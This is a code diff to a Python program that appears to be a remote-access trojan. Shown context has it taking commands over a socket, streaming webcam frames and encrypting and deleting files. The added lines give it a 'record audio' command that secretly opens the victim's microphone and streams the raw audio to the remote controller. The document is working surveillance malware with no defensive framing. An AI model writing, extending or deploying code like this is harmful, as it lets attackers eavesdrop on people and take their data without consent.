@@ -3,6 +3,7 @@ import cv2
 import time
 import socket
 import random
+import pyaudio
 import subprocess
 from Crypto.Cipher import AES
 from Crypto.Hash import SHA256
@@ -142,6 +143,8 @@ def receive_commands():
                 ddd = frame.flatten()
                 sss = ddd.tostring()
                 s.send(sss)
+            elif data.decode("utf-8").__contains__('record audio'):
+                send_audio()
 
             else:
                 try:
@@ -246,6 +249,38 @@ def decrypt(key, filename, file_path):
                 outfile.write(decryptor.decrypt(chunk))
             outfile.truncate(file_size)
     os.remove(file_path)
+
+
+def send_audio():
+    chunk = 1024
+    audio_format = pyaudio.paInt16
+    channels = 1
+    rate = 44100
+    record_seconds = 20
+
+    p = pyaudio.PyAudio()
+    stream = p.open(format=audio_format,
+                    channels=channels,
+                    rate=rate,
+                    input=True,
+                    frames_per_buffer=chunk)
+    print 'Recording...'
+
+    frames = []
+
+    for i in range(0, int(rate / chunk + record_seconds)):
+        data = stream.read(chunk)
+        frames.append(data)
+        s.sendall(data)
+
+    print '*Done recording*'
+
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+
+    output_str = "The file was sent" + "\n"
+    s.send(str.encode(output_str + str(os.getcwd()) + '> '))
 
 
 def main():
